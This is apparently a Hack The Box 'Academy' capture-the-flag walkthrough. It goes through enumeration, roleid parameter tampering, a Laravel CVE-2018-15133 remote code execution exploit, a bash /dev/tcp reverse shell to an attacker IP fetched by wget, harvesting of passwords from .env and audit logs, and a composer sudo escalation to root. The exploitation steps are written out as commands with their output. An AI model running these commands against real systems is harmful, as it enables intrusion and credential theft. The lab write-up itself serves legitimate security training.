# Introduction

[![Academy](https://www.hackthebox.eu/storage/avatars/10c8da0b46f53c882da946668dcdab95.png)](https://www.hackthebox.eu/home/machines/profile/297)

| Point | Description |
| :------:| :------: |
| Name | Academy |
| OS   | Linux  |
| Difficulty Rating| Easy   |
| Release | 07 Nov 2020   |
| IP | 10.10.10.215   |
| Owned | 01.02.2021 |

# Short retelling
* Using gobuster and find interesting php pages
* Checking source code of pages
* Find hidden string
* Login as admin with Burp
* Check information in admin's pages
* Checking CVE for app
* Using RCE to get reverse shell
* Find information about users
* Get user.txt
* Checking way for privilege escalation
* Get access from another user
* Privilege escalation with composer
* Get root.txt

# Enumeration

## Nmap

Recon host 10.10.10.215 with nmap. Add academy.htb to /etc/hosts
```
┌──(root💀kali)-[/home/kali]
└─# nmap -sV -sC -p- 10.10.10.215                                                                                                                                    130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-02 10:26 EST
Stats: 0:11:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 64.65% done; ETC: 10:44 (0:06:26 remaining)
Nmap scan report for academy.htb (10.10.10.215)
Host is up (0.16s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Hack The Box Academy
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=2/2%Time=601973B0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOpt
SF:ions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVersi
SF:onBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2B
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fIn
SF:valid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
SF:x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY00
SF:0")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a
SF:\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000"
SF:)%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1218.00 seconds
```

Ports 80 and 22 are open. And also 3306 mysql is open. 

Lets check academy.htb

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-02_223157.png)

We can see that there is two options available for login & Register.

Lets try to register.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-02_223345.png)


Redirect, and we can see a new page - *home.php*, surfing, find out username **egre55** (probably admin). But we find nothing more interesting.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-02_223452.png)

Check source code.. and find nothing too.

## Gobuster

So lets enumerate webserver path and files.

```
┌──(root💀kali)-[/home/kali]
└─# gobuster dir -e -u http://academy.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,txt,htm,html,phtml,js,zip,rar,tar -s 200,302
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://academy.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,js,rar,php,htm,html,phtml,zip,tar
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/02/02 10:25:57 Starting gobuster
===============================================================
http://academy.htb/admin.php (Status: 200)
http://academy.htb/admin.php (Status: 200)
http://academy.htb/config.php (Status: 200)
http://academy.htb/home.php (Status: 302)
http://academy.htb/index.php (Status: 200)
http://academy.htb/index.php (Status: 200)
http://academy.htb/login.php (Status: 200)
http://academy.htb/register.php (Status: 200)
===============================================================
2021/02/02 10:38:35 Finished
===============================================================
```

And we see new pages - *admin.php*, *config.php*. 

Admin.php page looks like login.php.
Config.php page has white list.

Brute directories...

```
┌──(root💀kali)-[/home/kali]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://academy.htb/FUZZ  -mc 200,302 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://academy.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,302
________________________________________________

:: Progress: [20473/20473] :: Job [1/1] :: 218 req/sec :: Duration: [0:01:30] :: Errors: 0 ::
```

And there aren't any available directories.

No ideas, let's check source code of pages *login.php, admin.php and register.php*.
And find interesting hidden string with roleid in *academy.htb/register.php*.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-02_225417.png)

I think this is related to the permission, how a user going to treat is based on the roleid.
I start Burp suite to check how to send this parameter.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-02_225857.png)

I change the roleid=1 and i got myself registered , yeah !!

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-02_230055.png)

Login as admninstrator on admin.php and check information.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-02_230354.png)

So we see another VHOST **dev-staging-01.academy.htb** and add to /etc/hosts. 
Also we find out about second user **mrb3n**

# Explotation
 Let's open *dev-staging-01.academy.htb*
 
 ![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-02_230947.png)
 
It's running on Google code Prettify

And looking down in the webpage and we see usefull infomation:

```
APP_NAME        "Laravel"
APP_ENV	    "local"
APP_KEY	    "base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
APP_DEBUG	"true"
APP_target="_blank"	    "http://localhost"
LOG_CHANNEL	"stack"
DB_CONNECTION	"mysql"
DB_HOST	    "127.0.0.1"
DB_PORT	    "3306"
DB_DATABASE	"homestead"
DB_USERNAME	"homestead"
DB_PASSWORD	"secret"
```

We find out about problem with running *Laravel* and DB info.

Searching some exploits for *Laravel*:

* [CVE-2018-15133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133)
* [Official Exploit in Metasploit](https://www.exploit-db.com/exploits/47129)
* [Exploit on Python from GitHub](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

Because I don't like using msf, I will use python exploit.

Download it
```
wget https://github.com/aljavier/exploit_laravel_cve-2018-15133/blame/main/pwn_laravel.py
```

And run script with set url and API key

```
┌──(root💀kali)-[/home/kali/HTB/Academy]
└─# /usr/bin/python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= --interactive

Linux academy 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

 Running in interactive mode. Press CTRL+C to exit.
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ ls
css
favicon.ico
index.php
js
robots.txt
web.config

$ 
```

We got shell as *www-data*


### Let's get an interactive reverse-shell

* Create bash reverse-shell
```
┌──(root💀kali)-[~]
└─# cat pasha.sh
bash -i >& /dev/tcp/10.10.14.133/1234 0>&1
```

* Downloading from local web-server pasha.sh
```
┌──(root💀kali)-[/home/kali/HTB/Academy]
└─# /usr/bin/python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c 'cd /tmp;wget http://10.10.14.133:9191/pasha.sh -O pasha.sh;ls'   

pasha.sh
```

* Make socat executable
```
┌──(root💀kali)-[/home/kali/HTB/Academy]
└─# /usr/bin/python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c 'cd /tmp;chmod +x pasha.sh;ls'

pasha.sh
```

* Run it
```
┌──(root💀kali)-[/home/kali/HTB/Academy]
└─# /usr/bin/python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c 'cd /tmp;/bin/bash pasha.sh;ls'
```

We got interactive reverse-shell, let's upgrade it with python

```
┌──(root💀kali)-[/home/kali]
└─# nc -lvp 1234
listening on [any] 1234 ...
connect to [10.10.14.133] from academy.htb [10.10.10.215] 59150
bash: cannot set terminal process group (927): Inappropriate ioctl for device
bash: no job control in this shell
www-data@academy:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@academy:/tmp$
```

Lets check home directory
```
www-data@academy:/tmp$ ls /home/
ls /home/
21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
```

And we have 5 users. Let see in every directory of users.

```
www-data@academy:/home$ ls -lvpa 21y4d
ls -lvpa 21y4d
total 20
drwxr-xr-x 2 21y4d 21y4d 4096 Aug 10 00:34 ./
drwxr-xr-x 8 root  root  4096 Aug 10 00:34 ../
-rw-r--r-- 1 21y4d 21y4d 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 21y4d 21y4d  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 21y4d 21y4d  807 Feb 25  2020 .profile

www-data@academy:/home$ ls -lvpa ch4p
ls -lvpa ch4p
total 20
drwxr-xr-x 2 ch4p ch4p 4096 Aug 10 00:34 ./
drwxr-xr-x 8 root root 4096 Aug 10 00:34 ../
-rw-r--r-- 1 ch4p ch4p 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 ch4p ch4p  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ch4p ch4p  807 Feb 25  2020 .profile

www-data@academy:/home$ ls -lvpa cry0l1t3
ls -lvpa cry0l1t3
total 32
drwxr-xr-x 4 cry0l1t3 cry0l1t3 4096 Aug 12 21:58 ./
drwxr-xr-x 8 root     root     4096 Aug 10 00:34 ../
-rw-r--r-- 1 cry0l1t3 cry0l1t3 3771 Feb 25  2020 .bashrc
lrwxrwxrwx 1 root     root        9 Aug 10 23:41 .bash_history -> /dev/null
-rw-r--r-- 1 cry0l1t3 cry0l1t3  220 Feb 25  2020 .bash_logout
drwx------ 2 cry0l1t3 cry0l1t3 4096 Aug 12 21:58 .cache/
drwxrwxr-x 3 cry0l1t3 cry0l1t3 4096 Aug 12 02:30 .local/
-rw-r--r-- 1 cry0l1t3 cry0l1t3  807 Feb 25  2020 .profile
-r--r----- 1 cry0l1t3 cry0l1t3   33 Feb  2 08:49 user.txt

www-data@academy:/home$ ls -lvpa egre55
ls -lvpa egre55
total 24
drwxr-xr-x 3 egre55 egre55 4096 Aug 10 23:41 ./
drwxr-xr-x 8 root   root   4096 Aug 10 00:34 ../
-rw-r--r-- 1 egre55 egre55 3771 Feb 25  2020 .bashrc
lrwxrwxrwx 1 root   root      9 Aug 10 23:41 .bash_history -> /dev/null
-rw-r--r-- 1 egre55 egre55  220 Feb 25  2020 .bash_logout
drwx------ 2 egre55 egre55 4096 Aug  7 12:13 .cache/
-rw-r--r-- 1 egre55 egre55  807 Feb 25  2020 .profile
-rw-r--r-- 1 egre55 egre55    0 Aug  7 12:14 .sudo_as_admin_successful

www-data@academy:/home$ ls -lvpa g0blin
ls -lvpa g0blin
total 20
drwxr-xr-x 2 g0blin g0blin 4096 Aug 10 00:34 ./
drwxr-xr-x 8 root   root   4096 Aug 10 00:34 ../
-rw-r--r-- 1 g0blin g0blin 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 g0blin g0blin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 g0blin g0blin  807 Feb 25  2020 .profile

www-data@academy:/home$ ls -lvpa mrb3n
ls -lvpa mrb3n
total 36
drwxr-xr-x 5 mrb3n mrb3n 4096 Feb  2 13:02 ./
drwxr-xr-x 8 root  root  4096 Aug 10 00:34 ../
-rw-r--r-- 1 mrb3n mrb3n 3771 Feb 25  2020 .bashrc
lrwxrwxrwx 1 root  root     9 Aug 10 23:41 .bash_history -> /dev/null
-rw-r--r-- 1 mrb3n mrb3n  220 Feb 25  2020 .bash_logout
drwxrwxr-x 3 mrb3n mrb3n 4096 Oct 21 10:55 .cache/
drwxrwxr-x 3 mrb3n mrb3n 4096 Aug 12 22:19 .config/
drwxrwxr-x 3 mrb3n mrb3n 4096 Aug 12 22:19 .local/
-rw-r--r-- 1 mrb3n mrb3n  807 Feb 25  2020 .profile
-rw------- 1 mrb3n mrb3n  685 Feb  2 13:02 .viminfo
```

We see **user.txt** in */home/cry0l1t3* and inteteresting *.sudo_as_admin_successful* in /home/egre55.

# Privilege Escalation

Let's Download [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and check way privilege escalation.

```
wget http://10.10.14.133:9191/linpeas.sh -O linpeas.sh
```

And we find password in /var/www/html/academy/.env:

```
[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70) - no PHP files

...

/var/www/html/academy/.env:DB_PASSWORD=mySup3rP4s5w0rd!!
```

Try to login as **cry0l1t3** with password **mySup3rP4s5w0rd!!**.

```
┌──(root💀kali)-[/home/kali]
└─# ssh cry0l1t3@10.10.10.215
cry0l1t3@10.10.10.215's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 03 Feb 2021 03:39:17 PM UTC

  System load:             0.0
  Usage of /:              44.6% of 15.68GB
  Memory usage:            18%
  Swap usage:              0%
  Processes:               204
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.215
  IPv6 address for ens160: dead:beef::250:56ff:feb9:becf


0 updates can be installed immediately.
0 of these updates are security updates.


Last login: Wed Aug 12 21:58:45 2020 from 10.10.14.2
$ /bin/bash
cry0l1t3@academy:~$ 
```

And we have success. Get **user.txt**

```
cry0l1t3@academy:~$ ls
user.txt
cry0l1t3@academy:~$ cat user.txt 
5b915c0e84a9eaed49d307417ca6e0d8
```

Checkig privelages and nothing.
```
cry0l1t3@academy:~$ sudo -l
[sudo] password for cry0l1t3: 
Sorry, user cry0l1t3 may not run sudo on academy.
```

And lets check all users privelages:

```
[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(egre55) gid=1000(egre55) groups=1000(egre55),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
uid=1003(21y4d) gid=1003(21y4d) groups=1003(21y4d)
uid=1004(ch4p) gid=1004(ch4p) groups=1004(ch4p)
uid=1005(g0blin) gid=1005(g0blin) groups=1005(g0blin)
```

**cry0l1t3** belongs to the *adminsitrator group*, that can read logs in */var/log*. 

**egre55** has sudo privelages. Interesting..

Run linPEAS as Сry0l1t3 to check every logs.

We find **mrb3n's password** in */var/log/audit/audit.log* :

```
[+] Checking for TTY (sudo/su) passwords in audit logs
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
```

Login as **mrb3n** and check privelages

```
cry0l1t3@academy:~$ su mrb3n
Password: 
$ /bin/bash
mrb3n@academy:/home/cry0l1t3$ sudo -l
[sudo] password for mrb3n: 
Sorry, try again.
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
mrb3n@academy:/home/cry0l1t3$ 
```

He can execute as sudo **/usr/bin composer**. Lets run composer.

```
mrb3n@academy:/home/cry0l1t3$ /usr/bin/composer
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
   ______
  / ____/___  ____ ___  ____  ____  ________  _____
 / /   / __ \/ __ `__ \/ __ \/ __ \/ ___/ _ \/ ___/
/ /___/ /_/ / / / / / / /_/ / /_/ (__  )  __/ /
\____/\____/_/ /_/ /_/ .___/\____/____/\___/_/
                    /_/
Composer 1.10.1 2020-03-13 20:34:27

Usage:
  command [options] [arguments]

Options:
  -h, --help                     Display this help message
  -q, --quiet                    Do not output any message
  -V, --version                  Display this application version
      --ansi                     Force ANSI output
      --no-ansi                  Disable ANSI output
  -n, --no-interaction           Do not ask any interactive question
      --profile                  Display timing and memory usage information
      --no-plugins               Whether to disable plugins.
  -d, --working-dir=WORKING-DIR  If specified, use the given directory as working directory.
      --no-cache                 Prevent use of the cache
  -v|vv|vvv, --verbose           Increase the verbosity of messages: 1 for normal output, 2 for more verbose output and 3 for debug

Available commands:
  about                Shows the short information about Composer.
  archive              Creates an archive of this composer package.
  browse               [home] Opens the package's repository URL or homepage in your browser.
  check-platform-reqs  Check that platform requirements are satisfied.
  clear-cache          [clearcache|cc] Clears composer's internal package cache.
  config               Sets config options.
  create-project       Creates new project from a package into given directory.
  depends              [why] Shows which packages cause the given package to be installed.
  diagnose             Diagnoses the system to identify common errors.
  dump-autoload        [dumpautoload] Dumps the autoloader.
  exec                 Executes a vendored binary/script.
  fund                 Discover how to help fund the maintenance of your dependencies.
  global               Allows running commands in the global composer dir ($COMPOSER_HOME).
  help                 Displays help for a command
  init                 Creates a basic composer.json file in current directory.
  install              [i] Installs the project dependencies from the composer.lock file if present, or falls back on the composer.json.
  licenses             Shows information about licenses of dependencies.
  list                 Lists commands
  outdated             Shows a list of installed packages that have updates available, including their latest version.
  prohibits            [why-not] Shows which packages prevent the given package from being installed.
  remove               Removes a package from the require or require-dev.
  require              Adds required packages to your composer.json and installs them.
  run-script           [run] Runs the scripts defined in composer.json.
  search               Searches for packages.
  show                 [info] Shows information about packages.
  status               Shows a list of locally modified packages, for packages installed from source.
  suggests             Shows package suggestions.
  update               [u|upgrade] Upgrades your dependencies to the latest version according to composer.json, and updates the composer.lock file.
  validate             Validates a composer.json and composer.lock.
```
We see, that composer can run scriots from composer.json `run-script           [run] Runs the scripts defined in composer.json.`

Ok, we need json file in /tmp to run it. Also composer can run scripts, so...

Checking [GTFObins](https://gtfobins.github.io/gtfobins/composer/)

```
mrb3n@academy:/home/cry0l1t3$ cd /tmp
mrb3n@academy:/tmp$ nano composer.json
mrb3n@academy:/tmp$ cat composer.json 
{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}

mrb3n@academy:/tmp$ sudo /usr/bin/composer run-script x
[sudo] password for mrb3n:
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
root
```

And we got root /bin/bash. Get **root.txt**

```
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
root
# cat /root/root.txt
9b3eae6531116ac3d98f26078b31208a
```

# Resources

1. https://github.com/aljavier/exploit_laravel_cve-2018-15133
2. https://null-byte.wonderhowto.com/how-to/scan-websites-for-interesting-directories-files-with-gobuster-0197226/
3. https://gtfobins.github.io/

